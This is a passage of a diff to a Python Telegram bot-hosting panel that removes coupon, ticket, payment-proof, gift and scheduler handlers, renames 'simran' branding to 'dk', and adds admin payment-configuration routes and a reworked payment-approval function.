-    sent, skipped = _send_broadcast(text, target_plan)
-    audit(m.from_user.id, "broadcast", f"sent={sent} skipped={skipped} plan={target_plan}")
-    bot.reply_to(m, f"{G['ok']} {sc('broadcast done')} — Sᴇɴᴛ {sent}, Sᴋɪᴘᴘᴇᴅ {skipped}")
-
-
 def _send_broadcast(text: str, target_plan: Optional[str]) -> Tuple[int, int]:
     sent = skipped = 0
     d = db_load()
@@ -12302,444 +8199,10 @@ def _send_broadcast(text: str, target_plan: Optional[str]) -> Tuple[int, int]:
 
 
 # ─── coupons ──────────────────────────────────────────────────────
-def _handle_coupon_user(m: types.Message) -> None:
-    USER_STATES.pop(m.from_user.id, None)
-    code = m.text.strip().upper()
-    d = db_load()
-    c = d["coupons"].get(code)
-    if not c or int(c.get("uses_left", 0)) <= 0:
-        bot.reply_to(m, f"{G['no']} {sc('invalid or expired code')}"); return
-    pct = int(c.get("percent", 0))
-    u = d["users"][str(m.from_user.id)]
-    u["wallet"] = int(u.get("wallet", 0)) + pct  # treat % as wallet credit (simple)
-    c["uses_left"] = int(c["uses_left"]) - 1
-    db_save(d)
-    bot.reply_to(m, f"{G['ok']} {sc('redeemed')} +{pct}\u09F3 {sc('to wallet')}")
-
-
-def _handle_coupon_admin(m: types.Message) -> None:
-    if not is_admin(m.from_user.id):
-        return
-    USER_STATES.pop(m.from_user.id, None)
-    parts = m.text.split()
-    if len(parts) < 2:
-        bot.reply_to(m, f"{G['no']} {sc('format')}: <code>Aᴅᴅ Cᴏᴅᴇ Pᴄᴛ Uꜱᴇꜱ</code> | <code>Dᴇʟ Cᴏᴅᴇ</code>",
-                     parse_mode="HTML"); return
-    op = parts[0].lower()
-    d = db_load()
-    if op == "add" and len(parts) >= 4:
-        code = parts[1].upper()
-        try:
-            pct = int(parts[2]); uses = int(parts[3])
-        except Exception:
-            bot.reply_to(m, f"{G['no']} {sc('bad numbers')}"); return
-        d["coupons"][code] = {"percent": pct, "uses_left": uses}
-        db_save(d)
-        audit(m.from_user.id, "coupon_add", f"code={code} pct={pct} uses={uses}")
-        bot.reply_to(m, f"{G['ok']} {sc('added')} {code}"); return
-    if op == "del" and len(parts) >= 2:
-        code = parts[1].upper()
-        if d["coupons"].pop(code, None):
-            db_save(d)
-            audit(m.from_user.id, "coupon_del", f"code={code}")
-            bot.reply_to(m, f"{G['ok']} {sc('removed')} {code}"); return
-        bot.reply_to(m, f"{G['no']} {sc('no such code')}"); return
-
-
 # ─── admin: admins ───────────────────────────────────────────────
-def _handle_admin_admins(m: types.Message) -> None:
-    if not is_owner(m.from_user.id):
-        return
-    USER_STATES.pop(m.from_user.id, None)
-    parts = m.text.split()
-    if len(parts) < 2:
-        return
-    op = parts[0].lower()
-    d = db_load()
-    if op == "add" and len(parts) >= 3:
-        try:
-            uid = int(parts[1])
-        except Exception:
-            bot.reply_to(m, f"{G['no']} {sc('bad uid')}"); return
-        role = parts[2]
-        if role not in {"view-only", "manage-users", "full-access"}:
-            bot.reply_to(m, f"{G['no']} {sc('bad role')}"); return
-        d["admins"][str(uid)] = {"role": role, "added": ts_iso(), "by": m.from_user.id}
-        db_save(d)
-        audit(m.from_user.id, "admin_add", f"uid={uid} role={role}")
-        bot.reply_to(m, f"{G['ok']} {sc('added admin')} {uid} ({role})"); return
-    if op == "del" and len(parts) >= 2:
-        try:
-            uid = int(parts[1])
-        except Exception:
-            bot.reply_to(m, f"{G['no']} {sc('bad uid')}"); return
-        if d["admins"].pop(str(uid), None):
-            db_save(d)
-            audit(m.from_user.id, "admin_del", f"uid={uid}")
-            bot.reply_to(m, f"{G['ok']} {sc('removed')} {uid}"); return
-
-
 # ─── tickets ──────────────────────────────────────────────────────
-def _handle_ticket_subject(m: types.Message) -> None:
-    USER_STATES[m.from_user.id] = {"flow": "await_ticket_body", "subject": m.text.strip()[:120]}
-    bot.reply_to(m, f"{G['ticket']} {sc('Now send the ticket body')}.")
-
-
-def _handle_ticket_body(m: types.Message, st: Dict[str, Any]) -> None:
-    subject = st.get("subject") or "Support"
-    d = db_load()
-    tid = rand_token(6)
-    d["tickets"][tid] = {
-        "id": tid, "uid": m.from_user.id, "subject": subject, "status": "open",
-        "messages": [{"from": "user", "text": m.text, "ts": ts_iso()}],
-        "opened_at": ts_iso(),
-    }
-    db_save(d)
-    USER_STATES.pop(m.from_user.id, None)
-    bot.reply_to(m, f"<b>{G['ok']} {sc('Ticket opened')} #{tid}</b>", parse_mode="HTML")
-    notify_owner(
-        f"<b>{G['ticket']} ɴᴇᴡ ᴛɪᴄᴋᴇᴛ #{tid}</b>\n"
-        f"{bullet('From', m.from_user.id)}\n"
-        f"{bullet('Subject', subject)}\n"
-        f"{bullet('Body', m.text[:400])}"
-    )
-
-
-def _handle_ticket_reply(m: types.Message, st: Dict[str, Any]) -> None:
-    tid = st.get("tid")
-    d = db_load()
-    t = d["tickets"].get(tid)
-    if not t:
-        USER_STATES.pop(m.from_user.id, None); return
-    if t["uid"] != m.from_user.id and not is_admin(m.from_user.id):
-        USER_STATES.pop(m.from_user.id, None); return
-    who = "admin" if is_admin(m.from_user.id) and t["uid"] != m.from_user.id else "user"
-    t.setdefault("messages", []).append({"from": who, "text": m.text, "ts": ts_iso()})
-    db_save(d)
-    USER_STATES.pop(m.from_user.id, None)
-    target = OWNER_ID if who == "user" else t["uid"]
-    try:
-        bot.send_message(
-            target,
-            f"<b>{G['ticket']} {sc('Ticket')} #{tid}</b> — {sc(who + ' replied')}\n"
-            f"{esc(m.text)[:1000]}",
-            parse_mode="HTML",
-        )
-    except Exception:
-        pass
-    bot.reply_to(m, f"{G['ok']} {sc('reply sent')}")
-
-
 # ─── payment proof ───────────────────────────────────────────────
-def _handle_payment_proof(m: types.Message, st: Dict[str, Any]) -> None:
-    method = st.get("method") or "unknown"
-    plan = st.get("plan")
-    p = PLAN_LIMITS.get(plan or "")
-    pid = rand_token(8)
-    d = db_load()
-    d["payments"].append({
-        "id": pid, "uid": m.from_user.id, "method": method, "plan": plan,
-        "amount": (p or {}).get("price", 0),
-        "status": "pending", "ts": ts_iso(),
-        "telegram_msg_id": m.message_id,
-    })
-    db_save(d)
-    USER_STATES.pop(m.from_user.id, None)
-    # forward proof to owner
-    try:
-        bot.forward_message(OWNER_ID, m.chat.id, m.message_id)
-    except Exception:
-        pass
-    notify_owner(
-        f"<b>{G['wallet']} ɴᴇᴡ ᴘᴀʏᴍᴇɴᴛ ᴘʀᴏᴏғ</b>\n"
-        f"{bullet('ID',     pid)}\n"
-        f"{bullet('From',   m.from_user.id)}\n"
-        f"{bullet('Method', method)}\n"
-        f"{bullet('Plan',   plan or '—')}\n"
-        f"{bullet('Amount', '{}$'.format((p or {}).get('price', 0)))}\n"
-        f"{sc('Tap below to approve or reject')}.",
-    )
-    kb = types.InlineKeyboardMarkup()
-    kb.add(
-        Btn(f"{G['ok']}  {sc('Approve')}", callback_data=f"payapprove_{pid}"),
-        Btn(f"{G['no']}  {sc('Reject')}",  callback_data=f"payreject_{pid}"),
-    )
-    try:
-        bot.send_message(OWNER_ID, f"<b>{sc('Decide')} #{pid}</b>",
-                         parse_mode="HTML", reply_markup=kb)
-    except Exception:
-        pass
-    bot.reply_to(m, f"<b>{G['ok']} {sc('proof received')}</b>\n#{pid} — {sc('await admin')}",
-                 parse_mode="HTML")
-
-
-def _handle_payment_proof_text(m: types.Message, st: Dict[str, Any]) -> None:
-    # text-only proofs (e.g. tx ids)
-    _handle_payment_proof(m, st)
-
-
-def _handle_topup_proof(m: types.Message) -> None:
-    pid = rand_token(8)
-    cap = (m.caption or m.text or "").strip()
-    amt = 0
-    if cap.isdigit():
-        amt = int(cap)
-    else:
-        ms = re.search(r"\d+", cap)
-        if ms:
-            amt = int(ms.group(0))
-    d = db_load()
-    d["payments"].append({
-        "id": pid, "uid": m.from_user.id, "method": "topup", "plan": None,
-        "amount": amt, "status": "pending", "ts": ts_iso(),
-        "telegram_msg_id": m.message_id, "kind": "wallet_topup",
-    })
-    db_save(d)
-    USER_STATES.pop(m.from_user.id, None)
-    try:
-        bot.forward_message(OWNER_ID, m.chat.id, m.message_id)
-    except Exception:
-        pass
-    kb = types.InlineKeyboardMarkup()
-    kb.add(
-        Btn(f"{G['ok']}  {sc('Approve')}", callback_data=f"payapprove_{pid}"),
-        Btn(f"{G['no']}  {sc('Reject')}",  callback_data=f"payreject_{pid}"),
-    )
-    notify_owner(
-        f"<b>{G['wallet']} ᴡᴀʟʟᴇᴛ ᴛᴏᴘᴜᴘ</b>\n"
-        f"{bullet('ID',     pid)}\n"
-        f"{bullet('From',   m.from_user.id)}\n"
-        f"{bullet('Amount', '{}$'.format(amt))}"
-    )
-    try:
-        bot.send_message(OWNER_ID, f"<b>{sc('Decide')} #{pid}</b>",
-                         parse_mode="HTML", reply_markup=kb)
-    except Exception:
-        pass
-    bot.reply_to(m, f"<b>{G['ok']} {sc('top-up proof received')}</b>", parse_mode="HTML")
-
-
-def action_payment_approve(call: types.CallbackQuery, pid: str) -> None:
-    if not admin_only_call(call, "approve_payment"):
-        return
-    d = db_load()
-    pay = next((x for x in d["payments"] if x.get("id") == pid), None)
-    if not pay:
-        ack(call, "Not found"); return
-    # Idempotency: rapid double-tap on Approve must not credit twice or
-    # grant the plan twice. Refuse if status is already a terminal one.
-    if pay.get("status") in ("approved", "rejected"):
-        ack(call, f"Already {pay['status']}.")
-        return
-    loading(call, "Approving payment")
-    pay["status"] = "approved"
-    pay["approved_by"] = call.from_user.id
-    pay["approved_at"] = ts_iso()
-    db_save(d)
-    if pay.get("kind") == "wallet_topup":
-        u = d["users"].get(str(pay["uid"]))
-        if u:
-            u["wallet"] = int(u.get("wallet", 0)) + int(pay.get("amount", 0))
-            db_save(d)
-            try:
-                bot.send_message(pay["uid"],
-                                 f"<b>{G['ok']} {sc('Wallet credited')}</b>\n"
-                                 f"{bullet('Amount', '{}$'.format(pay['amount']))}",
-                                 parse_mode="HTML")
-            except Exception:
-                pass
-    elif pay.get("plan"):
-        grant_plan(pay["uid"], pay["plan"])
-        post_announcement(
-            f"<b>{G['spark']} ɴᴇᴡ ᴀᴄᴛɪᴠᴀᴛɪᴏɴ</b>\n"
-            f"{bullet('Plan', PLAN_LIMITS[pay['plan']]['name'])}\n"
-            f"{bullet('User', '@hidden')}"
-        )
-    audit(call.from_user.id, "pay_approve", f"pid={pid}")
-    ack(call, "Approved")
-    try:
-        bot.edit_message_text(f"<b>{G['ok']} {sc('Approved')} #{pid}</b>",
-                              chat_id=call.message.chat.id,
-                              message_id=call.message.message_id, parse_mode="HTML")
-    except Exception:
-        pass
-
-
-def action_payment_reject(call: types.CallbackQuery, pid: str) -> None:
-    if not admin_only_call(call, "approve_payment"):
-        return
-    d = db_load()
-    pay = next((x for x in d["payments"] if x.get("id") == pid), None)
-    if not pay:
-        ack(call, "Not found"); return
-    if pay.get("status") in ("approved", "rejected"):
-        ack(call, f"Already {pay['status']}.")
-        return
-    loading(call, "Rejecting payment")
-    pay["status"] = "rejected"
-    pay["rejected_by"] = call.from_user.id
-    pay["rejected_at"] = ts_iso()
-    db_save(d)
-    audit(call.from_user.id, "pay_reject", f"pid={pid}")
-    try:
-        bot.send_message(pay["uid"],
-                         f"<b>{G['no']} {sc('Payment rejected')}</b> #{pid}\n"
-                         f"{sc('Contact')} {SUPPORT_USR}",
-                         parse_mode="HTML")
-    except Exception:
-        pass
-    ack(call, "Rejected")
-    try:
-        bot.edit_message_text(f"<b>{G['no']} {sc('Rejected')} #{pid}</b>",
-                              chat_id=call.message.chat.id,
-                              message_id=call.message.message_id, parse_mode="HTML")
-    except Exception:
-        pass
-
-
 # ─── gift plan flow ───────────────────────────────────────────────
-def _handle_gift_target(m: types.Message, st: Dict[str, Any]) -> None:
-    try:
-        tgt = int(m.text.strip())
-    except Exception:
-        bot.reply_to(m, f"{G['no']} {sc('bad uid')}"); return
-    d = db_load()
-    if str(tgt) not in d["users"]:
-        bot.reply_to(m, f"{G['no']} {sc('user not found')}"); return
-    USER_STATES[m.from_user.id] = {"flow": "await_gift_confirm", "target": tgt}
-    bot.reply_to(
-        m,
-        f"<b>{G['warn']} {sc('Confirm gift')}</b>\n"
-        f"{bullet('To',   tgt)}\n"
-        f"{bullet('Plan', d['users'][str(m.from_user.id)].get('plan'))}\n"
-        f"{sc('Send')} <code>YES</code> {sc('to confirm or anything else to cancel')}.",
-        parse_mode="HTML",
-    )
-
-
-def _handle_gift_confirm(m: types.Message, st: Dict[str, Any]) -> None:
-    USER_STATES.pop(m.from_user.id, None)
-    if (m.text or "").strip().upper() != "YES":
-        bot.reply_to(m, f"{G['no']} {sc('cancelled')}"); return
-    tgt = int(st["target"])
-    d = db_load()
-    me = d["users"][str(m.from_user.id)]
-    if me.get("plan") in ("free", None):
-        bot.reply_to(m, f"{G['no']} {sc('no active plan to gift')}"); return
-    plan = me["plan"]; exp = me.get("plan_expires")
-    me["plan"] = "free"; me["plan_expires"] = None
-    if str(tgt) in d["users"]:
-        d["users"][str(tgt)]["plan"] = plan
-        d["users"][str(tgt)]["plan_expires"] = exp
-    db_save(d)
-    audit(m.from_user.id, "plan_gift", f"to={tgt} plan={plan}")
-    bot.reply_to(m, f"{G['ok']} {sc('plan gifted to')} {tgt}")
-    try:
-        bot.send_message(tgt,
-                         f"<b>{G['spark']} {sc('You received a gift plan')}</b>\n"
-                         f"{bullet('Plan', PLAN_LIMITS[plan]['name'])}",
-                         parse_mode="HTML")
-    except Exception:
-        pass
-
-
-# ═════════════════════════════════════════════════════════════════
-# 23. SCHEDULER  (background loops)
-# ═════════════════════════════════════════════════════════════════
-
-def cron_runner() -> None:
-    """Every minute: cron jobs, expiry reminders, scheduled broadcasts, downgrades."""
-    last_per_bot: Dict[str, Dict[str, float]] = {}
-    while True:
-        try:
-            now = time.time()
-            d = db_load()
-
-            # plan expiry + reminders
-            downgrade_expired_users()
-            expiry_reminders()
-
-            # scheduled broadcasts
-            sb = d.get("scheduled_broadcasts", [])
-            kept: List[Dict[str, Any]] = []
-            for b in sb:
-                try:
-                    when = datetime.fromisoformat(str(b["at"]).replace("Z", "+00:00"))
-                except Exception:
-                    continue
-                if when <= now_utc():
-                    _send_broadcast(b["text"], b.get("plan"))
-                    audit(b.get("by", 0), "broadcast_run", "scheduled")
-                else:
-                    kept.append(b)
-            if len(kept) != len(sb):
-                d["scheduled_broadcasts"] = kept
-                db_save(d)
-
-            # per-bot cron (restart / backup)
-            for bid, bdoc in db_load()["bots"].items():
-                cron = bdoc.get("cron") or {}
-                last = last_per_bot.setdefault(bid, {})
-                if cron.get("restart_hours"):
-                    iv = int(cron["restart_hours"]) * 3600
-                    if now - last.get("restart", 0) >= iv:
-                        try:
-                            restart_child(bdoc)
-                        except Exception:
-                            pass
-                        last["restart"] = now
-                if cron.get("backup_hours"):
-                    iv = int(cron["backup_hours"]) * 3600
-                    if now - last.get("backup", 0) >= iv:
-                        try:
-                            res = gh_backup_now()
-                            if not res.get("ok"):
-                                print(f"[cron] backup failed: {res.get('error')}",
-                                      flush=True)
-                        except Exception as e:
-                            print(f"[cron] backup error: {e}", flush=True)
-                            traceback.print_exc()
-                        last["backup"] = now
-
-            # ── auto backup — sirf tab jab koi bot 10+ min se online ho ──
-            should_backup = False
-            for bid, rinfo in list(RUNNING.items()):
-                started_ms = rinfo.get("started", 0)
-                online_sec = (time.time() * 1000 - started_ms) / 1000
-                if online_sec >= 600:  # 10 min = 600 sec
-                    should_backup = True
-                    break
-            if should_backup:
-                try:
-                    res = gh_backup_now()
-                    if res.get("ok"):
-                        print("[cron] auto backup ok", flush=True)
-                    else:
-                        print(f"[cron] auto backup failed: {res.get('error')}", flush=True)
-                except Exception as e:
-                    print(f"[cron] auto backup error: {e}", flush=True)
-
-        except Exception:
-            traceback.print_exc()
-        time.sleep(60)
-
-
-# ═════════════════════════════════════════════════════════════════
-# 24. BOOTSTRAP / MAIN
-# ═════════════════════════════════════════════════════════════════
-
-def banner() -> None:
-    line = "=" * 64
-    print(line)
-    print(f"   {BRAND_TAG}")
-    print(f"   uptime port : {KEEPALIVE_PORT}")
-    print(f"   owner id    : {OWNER_ID}")
-    print(f"   github keys : {'GitHub' if KEYRING.gh_enabled() else 'local cache'}")
-    print(f"   github bkp  : {'on' if gh_enabled() else 'off'}")
-    print(f"   announcements: {ANNOUNCE_CHANNEL or '—'}")
-    print(line)
-
-
 def _acquire_singleton_lock() -> Optional[Any]:
     """Best-effort single-instance guard. Prevents two local copies of the
     panel from running on the same machine (which would otherwise both poll
@@ -12763,175 +8226,6 @@ def _acquire_singleton_lock() -> Optional[Any]:
             f"(see {lock_path}). Stop it first, otherwise every button press "
             "will be processed twice."
         )
-
-
-def main() -> int:
-    banner()
-    global _LOCK_FH_KEEPALIVE
-    _LOCK_FH_KEEPALIVE = _acquire_singleton_lock()
-    # restore previously auto-claimed owner (when OWNER_ID env is unset)
-    global OWNER_ID, BRAND_TAG, ANNOUNCE_CHANNEL
-    stored_owner = int(get_setting("owner_id", 0) or 0)
-    if stored_owner > 0:
-        # An admin transfer takes precedence; otherwise the env-var
-        # owner is the source of truth.
-        OWNER_ID = stored_owner if OWNER_ID <= 0 or stored_owner != OWNER_ID else OWNER_ID
-        if OWNER_ID <= 0:
-            OWNER_ID = stored_owner
-    # restore admin-edited brand & announce channel
-    bt = get_setting("brand_tag", None)
-    if isinstance(bt, str) and bt:
-        BRAND_TAG = bt
-    ac = get_setting("announce_channel", None)
-    if isinstance(ac, str):
-        ANNOUNCE_CHANNEL = ac
-    gh_load_config()
-    GH["autoEnabled"] = bool(get_setting("github_auto_enabled", True))
-
-    # restore from GitHub if storage is empty
-    try:
-        res = gh_auto_restore_on_boot()
-        if res and res.get("ok"):
-            print(f"[boot] restored backup ({fmt_bytes(res.get('sizeBytes', 0))})")
-    except Exception:
-        pass
-
-    # background services
-    threading.Thread(target=gh_auto_loop, daemon=True).start()
-    threading.Thread(target=gh_uptime_backup_loop, daemon=True,
-                     name="gh-uptime-backup").start()
-    threading.Thread(target=cron_runner, daemon=True).start()
-    threading.Thread(target=_verify_state_janitor, daemon=True,
-                     name="verify-janitor").start()
-    threading.Thread(target=_sched_check_and_run, daemon=True,
-                     name="scheduler").start()
-    _start_keepalive()
-
-    # set bot commands
-    try:
-        bot.set_my_commands([
-            types.BotCommand("start",  "open main menu"),
-            types.BotCommand("menu",   "main menu"),
-            types.BotCommand("help",   "show help"),
-            types.BotCommand("id",     "show your user id"),
-            types.BotCommand("cancel", "cancel current action"),
-        ])
-    except Exception:
-        pass
-
-    notify_owner(
-        f"<b>{G['ok']} {sc('Panel online')}</b>\n"
-        f"{bullet('Brand',  BRAND_TAG)}\n"
-        f"{bullet('Started', fmt_ts(ts_iso()))}\n"
-        f"{bullet('Users',  len(db_load()['users']))}\n"
-        f"{bullet('Bots',   len(db_load()['bots']))}"
-    )
-
-    # autostart bots that were marked running
-    for b in db_load()["bots"].values():
-        if b.get("status") == "running":
-            try:
-                start_child(b)
-            except Exception:
-                pass
-
-    # ── clear any leftover webhook so polling is the only delivery path ──
-    # If a webhook is still registered for this token (from a previous host
-    # or a different deployment), Telegram will keep posting updates to it
-    # AND deliver them to our polling loop, causing every callback to fire
-    # 2-3 times. drop_pending_updates also clears the backlog so we start
-    # fresh.
-    try:
-        bot.remove_webhook()
-        try:
-            bot.delete_webhook(drop_pending_updates=True)
-        except Exception:
-            pass
-        print("[bot] webhook cleared")
-    except Exception as e:
-        print(f"[bot] webhook clear warning: {e}")
-
-    print("[bot] polling...")
-    while True:
-        try:
-            bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=25)
-        except KeyboardInterrupt:
-            print("\n[bot] stopping...")
-            for bid in list(RUNNING.keys()):
-                stop_child(bid, manual=False)
-            return 0
-        except Exception as e:
-            print(f"[bot] poll error: {e}")
-            time.sleep(5)
-
-
-# NOTE: entrypoint stays at the bottom of this file so runtime hooks
-# defined further down get registered BEFORE main() starts polling.
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# ██████████████  ULTRA-ADVANCED HELP & ANALYTICS SYSTEM  ██████████████████████
-# ═══════════════════════════════════════════════════════════════════════════════
-
-_HELP_PAGES = {
-    "main": {
-        "title": "📚 Help Centre",
-        "text": (
-            "Welcome to <b>Simran Hosting Bot</b>\n\n"
-            "<b>Quick Start</b>\n"
-            "1. Register with /start\n"
-            "2. Upload your .py or .zip file\n"
-            "3. Set BOT_TOKEN env var\n"
-            "4. Press Start\n\n"
-            "<b>Commands</b>\n"
-            "/start /menu /help /id /cancel /status /profile /plans /pay /refer /coupon"
-        ),
-        "subs": ["upload", "manage", "plans", "github", "referral"],
-    },
-    "upload": {
-        "title": "📤 Uploading Bots",
-        "text": (
-            "<b>Method 1:</b> Send .py directly\n"
-            "<b>Method 2:</b> Send .zip (main file = main.py or bot.py)\n"
-            "<b>Method 3:</b> GitHub File Browser\n\n"
-            "<b>Limits:</b> max upload size per plan, .py/.js/.zip allowed"
-        ),
-    },
-    "manage": {
-        "title": "🤖 Managing Bots",
-        "text": (
-            "My Bots → select → Start/Stop/Restart\n"
-            "View logs in real time (last 500 lines ring buffer)\n"
-            "Download source as ZIP any time\n"
-            "Crash auto-restart (configurable max retries)"
-        ),
-    },
-    "plans": {
-        "title": "💳 Plans & Billing",
-        "text": (
-            "Free: 1 bot, 50 MB\n"
-            "Basic: 3 bots, 100 MB\n"
-            "Pro: 10 bots, 500 MB\n"
-            "Ultra: unlimited bots, 2 GB\n\n"
-            "Pay via UPI/Crypto/PayPal → send proof → admin approves"
-        ),
-    },
-    "github": {
-        "title": "🐙 GitHub Integration",
-        "text": (
-            "Admin → GitHub → enter PAT + repo\n"
-            "Auto-backup on start/stop/every N minutes\n"
-            "GitHub Browser: browse any public repo, deploy files as bots"
-        ),
-    },
-    "referral": {
-        "title": "👥 Referral System",
-        "text": (
-            "Share your link, earn credits per sign-up\n"
-            "Menu → Refer & Earn → copy link\n"
-            "Admin configures reward amount and min plan requirement"
-        ),
-    },
-}
 
 
 def render_help_page(chat_id, page, call=None):
@@ -13056,11 +8350,6 @@ def _rev_goal_progress():
         "remaining": max(0.0, goal - this_month),
         "pct":       pct,
     }
-
-
-def _rev_projected_monthly():
-    day = now_utc().day or 1
-    return round(_rev_this_month() / day * 30, 2)
 
 
 # ─── Notification Queue ─────────────────────────────────────────────────────
@@ -14536,7 +9825,7 @@ def render_adm_rate_stats(call):
 
 def action_adm_export_full_db(call):
     data  = _export_full_db()
-    fname = f"simran_db_{now_utc().strftime('%Y%m%d_%H%M%S')}.json"
+    fname = f"dk_db_{now_utc().strftime('%Y%m%d_%H%M%S')}.json"
     import io
     bot.send_document(call.message.chat.id, (fname, io.BytesIO(data)),
                       caption=f"<b>📂 Full DB Export</b>\n{bullet('Size', fmt_bytes(len(data)))}",
@@ -14546,7 +9835,7 @@ def action_adm_export_full_db(call):
 
 def action_adm_export_users_csv(call):
     data  = _export_users_csv()
-    fname = f"simran_users_{now_utc().strftime('%Y%m%d')}.csv"
+    fname = f"dk_users_{now_utc().strftime('%Y%m%d')}.csv"
     import io
     bot.send_document(call.message.chat.id, (fname, io.BytesIO(data)),
                       caption=f"<b>👥 Users CSV</b>\n{bullet('Size', fmt_bytes(len(data)))}",
@@ -14556,7 +9845,7 @@ def action_adm_export_users_csv(call):
 
 def action_adm_export_bots_csv(call):
     data  = _export_bots_csv()
-    fname = f"simran_bots_{now_utc().strftime('%Y%m%d')}.csv"
+    fname = f"dk_bots_{now_utc().strftime('%Y%m%d')}.csv"
     import io
     bot.send_document(call.message.chat.id, (fname, io.BytesIO(data)),
                       caption=f"<b>🤖 Bots CSV</b>\n{bullet('Size', fmt_bytes(len(data)))}",
@@ -14566,7 +9855,7 @@ def action_adm_export_bots_csv(call):
 
 def action_adm_export_trans_csv(call):
     data  = _export_transactions_csv()
-    fname = f"simran_transactions_{now_utc().strftime('%Y%m%d')}.csv"
+    fname = f"dk_transactions_{now_utc().strftime('%Y%m%d')}.csv"
     import io
     bot.send_document(call.message.chat.id, (fname, io.BytesIO(data)),
                       caption=f"<b>💳 Transactions CSV</b>\n{bullet('Size', fmt_bytes(len(data)))}",
@@ -14576,7 +9865,7 @@ def action_adm_export_trans_csv(call):
 
 def action_adm_export_audit_csv(call):
     data  = _export_audit_log_csv()
-    fname = f"simran_audit_{now_utc().strftime('%Y%m%d')}.csv"
+    fname = f"dk_audit_{now_utc().strftime('%Y%m%d')}.csv"
     import io
     bot.send_document(call.message.chat.id, (fname, io.BytesIO(data)),
                       caption=f"<b>🔐 Audit CSV</b>\n{bullet('Size', fmt_bytes(len(data)))}",
@@ -14689,6 +9978,39 @@ def _register_extra_routes(data, call):
     # Extra admin panels
     if data == "adm_diagnostics":            render_adm_diagnostics(call); return True
     if data == "adm_payment_requests":       render_adm_payment_requests(call); return True
+    # Payment config sub-pages (adm_pay_config itself is in _ADVANCED_PANEL_MAP)
+    if data == "adm_pay_methods":            render_adm_pay_methods(call); return True
+    if data == "adm_pay_limits":             render_adm_pay_limits(call); return True
+    if data == "adm_pay_currency":           render_adm_pay_currency(call); return True
+    if data == "adm_pay_receipt_tmpl":       render_adm_pay_receipt_tmpl(call); return True
+    if data == "adm_pay_notif":              render_adm_pay_notif_settings(call); return True
+    if data == "adm_pay_auto_approve":
+        cur = bool(get_setting("auto_approve_payments", False))
+        set_setting("auto_approve_payments", not cur)
+        audit(call.from_user.id, "auto_approve_toggle", f"now={not cur}")
+        ack(call, f"Auto-approve: {'ON' if not cur else 'OFF'}")
+        render_adm_pay_config(call); return True
+    if data.startswith("adm_pay_edit_"):
+        render_adm_pay_method_edit(call, data[len("adm_pay_edit_"):]); return True
+    if data.startswith("adm_pay_method_toggle_") or data.startswith("adm_pay_method_setnumber_"):
+        action_adm_pay_method_number(call, data); return True
+    if data == "adm_pay_method_add":         render_adm_pay_method_add(call); return True
+    if data.startswith("adm_pay_method_addtype_"):
+        render_adm_pay_method_addtype(call, data[len("adm_pay_method_addtype_"):]); return True
+    if data.startswith("adm_pay_method_del_"):
+        render_adm_pay_method_del_confirm(call, data[len("adm_pay_method_del_"):]); return True
+    if data.startswith("adm_pay_method_delyes_"):
+        action_adm_pay_method_delete(call, data[len("adm_pay_method_delyes_"):]); return True
+    if data.startswith("adm_pay_method_setistr_"):
+        _start_pay_method_set_instructions(call, data[len("adm_pay_method_setistr_"):]); return True
+    if data.startswith("adm_bc_set_currency_"):
+        parts = data[len("adm_bc_set_currency_"):].split("_", 1)
+        if len(parts) == 2:
+            set_setting("payment_currency", parts[0])
+            set_setting("currency_symbol", parts[1])
+            audit(call.from_user.id, "set_currency", f"{parts[0]}/{parts[1]}")
+            ack(call, f"Currency set to {parts[0]} {parts[1]}")
+        render_adm_pay_currency(call); return True
     if data == "adm_process_monitor":        render_adm_process_monitor(call); return True
     if data == "adm_security_log":           render_adm_security_log(call); return True
     if data == "adm_broadcast_status":       render_adm_broadcast_status(call); return True
@@ -14838,7 +10160,7 @@ def tg_channel_backup_now() -> Dict[str, Any]:
                     f"{bullet('Brand', BRAND_TAG)}"
                 ),
                 parse_mode="HTML",
-                visible_file_name=f"simran_backup_{stamp}.zip",
+                visible_file_name=f"dk_backup_{stamp}.zip",
             )
         target.unlink(missing_ok=True)
         audit(0, "tg_channel_backup", f"channel={ch} size={sz}")
@@ -15745,7 +11067,7 @@ def render_referral(call: types.CallbackQuery) -> None:
         me = bot.get_me()
         link = f"https://t.me/{me.username}?start={uid}"
     except Exception:
-        link = f"https://t.me/SimranRBOT?start={uid}"
+        link = f"https://t.me/DKHostingRBOT?start={uid}"
     cap = (
         f"<b>{G['users']} {sc('Referral')}</b>\n"
         f"{G['div_eq']}\n"
@@ -16813,36 +12135,54 @@ def action_payment_approve(call: types.CallbackQuery, pid: str) -> None:
     d = db_load()
     pay = next((x for x in d["payments"] if x.get("id") == pid), None)
     if not pay:
-        ack(call, "Not found"); return
+        ack(call, "Payment not found"); return
     if pay.get("status") in ("approved", "rejected"):
         ack(call, f"Already {pay['status']}."); return
-    loading(call, "Approving payment")
+
+    loading(call, "Approving payment...")
+
+    # Atomic: update everything then single db_save
     pay["status"] = "approved"
     pay["approved_by"] = call.from_user.id
     pay["approved_at"] = ts_iso()
-    db_save(d)
+
     if pay.get("kind") == "wallet_topup":
-        u = d["users"].get(str(pay["uid"]))
-        if u:
-            u["wallet"] = int(u.get("wallet", 0)) + int(pay.get("amount", 0))
-            db_save(d)
-            try:
-                bot.send_message(pay["uid"],
-                    f"<b>{G['ok']} {sc('Wallet credited')}</b>\n"
-                    f"{bullet('Amount', '{}$'.format(pay['amount']))}", parse_mode="HTML")
-            except Exception:
-                pass
+        uid_str = str(pay["uid"])
+        if uid_str in d["users"]:
+            d["users"][uid_str]["wallet"] = int(d["users"][uid_str].get("wallet", 0)) + int(pay.get("amount", 0))
     elif pay.get("plan"):
-        grant_plan(pay["uid"], pay["plan"])
+        uid_str = str(pay["uid"])
+        if uid_str in d["users"]:
+            pl = PLAN_LIMITS.get(pay["plan"], PLAN_LIMITS["free"])
+            days = pl["days"]
+            d["users"][uid_str]["plan"] = pay["plan"]
+            d["users"][uid_str]["plan_expires"] = (now_utc() + timedelta(days=days)).isoformat()
+
+    db_save(d)  # single atomic save
+
     audit(call.from_user.id, "pay_approve", f"pid={pid}")
-    ack(call, "Approved")
+
     try:
-        bot.edit_message_text(f"<b>{G['ok']} {sc('Approved')} #{pid}</b>",
+        if pay.get("kind") == "wallet_topup":
+            bot.send_message(pay["uid"],
+                f"<b>{G['ok']} {sc('Wallet credited')}</b>\n"
+                f"{bullet('Amount', str(pay['amount']) + '৳')}"
+                f"{FOOTER}", parse_mode="HTML")
+        elif pay.get("plan"):
+            bot.send_message(pay["uid"],
